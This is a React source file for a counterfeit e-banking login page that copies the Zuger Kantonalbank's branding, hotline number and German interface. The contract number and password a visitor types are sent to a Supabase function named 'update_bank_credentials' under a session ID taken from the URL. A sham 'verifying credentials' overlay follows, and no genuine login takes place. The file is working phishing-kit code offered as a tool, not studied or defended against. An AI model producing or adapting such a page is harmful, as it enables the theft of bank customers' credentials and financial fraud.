import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { ArrowRight, Facebook, Instagram, Youtube, Linkedin } from "lucide-react";
import logoAsset from "@/assets/zuger-kantonalbank-logo.svg.asset.json";
import sloganAsset from "@/assets/zuger-kantonalbank-slogan.svg.asset.json";

const BLUE = "#0085ca";
const FOOTER_BG = "#204a77";
const BORDER = "#ced4da";
const BTN_GRAY = "#999fa1";

const XingIcon = ({ color = FOOTER_BG, size = 16 }: { color?: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill={color} xmlns="http://www.w3.org/2000/svg">
    <path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.539l-4.879-8.916c-.004-.006-.004-.016 0-.022L21.235.756c.095-.193.097-.387.006-.539C21.151.08 20.987 0 20.775 0h-2.587zM3.648 4.74c-.211 0-.385.074-.475.222-.092.151-.078.347.02.541l2.336 4.05c.005.01.005.014 0 .022L1.86 16.527c-.099.193-.093.387 0 .538.092.149.245.241.455.241h3.463c.516 0 .766-.348.945-.667l3.733-6.609-2.378-4.155c-.172-.315-.435-.664-.965-.664H3.648z" />
  </svg>
);

const SocialCircle = ({ children }: { children: React.ReactNode }) => (
  <a
    href="#"
    className="w-8 h-8 rounded-full bg-white flex items-center justify-center hover:opacity-80 transition"
  >
    {children}
  </a>
);

const ChZugerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Zuger Kantonalbank – E-Banking", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Header */}
        <header className="w-full bg-white">
          <div className="w-full px-4 md:px-8 py-5 flex items-center justify-between">
            <div className="flex items-center gap-6">
              <img src={logoAsset.url} alt="Zuger Kantonalbank" className="h-9" />
              <img src={sloganAsset.url} alt="Wir begleiten Sie im Leben." className="hidden sm:block h-3" />
            </div>
            <nav className="flex items-center gap-6 text-[14px]">
              <a href="#" className="text-[#999]">Deutsch</a>
              <a href="#" style={{ color: BLUE }}>English</a>
            </nav>
          </div>
        </header>

        {/* Body */}
        <main className="w-full flex-1 bg-white py-2">
          <div className="w-full px-4 md:w-3/5 md:px-0 mx-auto">
            <div className="border-t border-[#e5e5e5]" />

            <h1
              className="text-[28px] font-light my-8"
              style={{ color: BLUE }}
            >
              Login E-Banking / Kundenportal
            </h1>

            <div className="border-t border-[#e5e5e5]" />

            <div className="py-8">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-y-4 md:gap-x-6 items-center">
                <label className="text-[15px] text-[#555]" htmlFor="vertragsnummer">
                  Vertragsnummer
                </label>
                <input
                  id="vertragsnummer"
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className="md:col-span-2 w-full px-3 py-2.5 bg-white border rounded-[3px] text-[15px] outline-none transition-shadow focus:shadow-[0_0_0_3px_rgba(0,133,202,0.18)]"
                  style={{ borderColor: BORDER }}
                  onFocus={(e) => (e.currentTarget.style.borderColor = BLUE)}
                  onBlur={(e) => (e.currentTarget.style.borderColor = BORDER)}
                />

                <label className="text-[15px] text-[#555]" htmlFor="passwort">
                  Passwort
                </label>
                <input
                  id="passwort"
                  type="password"
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="md:col-span-2 w-full px-3 py-2.5 bg-white border rounded-[3px] text-[15px] outline-none transition-shadow focus:shadow-[0_0_0_3px_rgba(0,133,202,0.18)]"
                  style={{ borderColor: BORDER }}
                  onFocus={(e) => (e.currentTarget.style.borderColor = BLUE)}
                  onBlur={(e) => (e.currentTarget.style.borderColor = BORDER)}
                />

                <div className="hidden md:block" />
                <div className="md:col-span-2 flex justify-end mt-2">
                  <a
                    href="#"
                    className="text-[14px] hover:underline"
                    style={{ color: BLUE }}
                  >
                    Passwort vergessen ?
                  </a>
                </div>

                <div className="hidden md:block" />
                <div className="md:col-span-2 flex justify-end mt-4">
                  <button
                    onClick={handleSubmit}
                    className="text-white text-[15px] rounded-[3px] py-2.5 px-10 transition-colors"
                    style={{ backgroundColor: BTN_GRAY }}
                    onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = BLUE)}
                    onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = BTN_GRAY)}
                  >
                    Login
                  </button>
                </div>
              </div>
            </div>

            <div className="border-t border-[#e5e5e5]" />
          </div>
        </main>

        {/* Footer */}
        <footer className="w-full" style={{ backgroundColor: FOOTER_BG }}>
          <div className="w-full px-4 md:px-8 py-10 text-white grid grid-cols-1 md:grid-cols-2 gap-8">
            {/* Left column */}
            <div className="text-[14px]">
              <div className="font-semibold text-[15px] mb-2">Kundenzentrum</div>
              <div>Hotline +41 41 709 11 11</div>
              <div>Montag bis Freitag von 8.00 - 18.00 Uhr</div>
              <ul className="mt-5 space-y-1.5">
                {[
                  "Live-Support mit Berater starten",
                  "E-Banking Hilfe",
                  "Cookie Policy",
                ].map((l) => (
                  <li key={l}>
                    <a href="#" className="flex items-center gap-2 hover:underline">
                      <ArrowRight size={14} />
                      <span>{l}</span>
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            {/* Right column */}
            <div className="flex flex-col md:items-end gap-4 text-[14px]">
              <div>© Zuger Kantonalbank</div>
              <div className="flex items-center gap-3">
                <SocialCircle><Facebook size={16} color={FOOTER_BG} fill={FOOTER_BG} /></SocialCircle>
                <SocialCircle><Instagram size={16} color={FOOTER_BG} /></SocialCircle>
                <SocialCircle><Youtube size={16} color={FOOTER_BG} fill={FOOTER_BG} /></SocialCircle>
                <SocialCircle><Linkedin size={16} color={FOOTER_BG} fill={FOOTER_BG} /></SocialCircle>
                <SocialCircle><XingIcon /></SocialCircle>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChZugerKantonalbank;
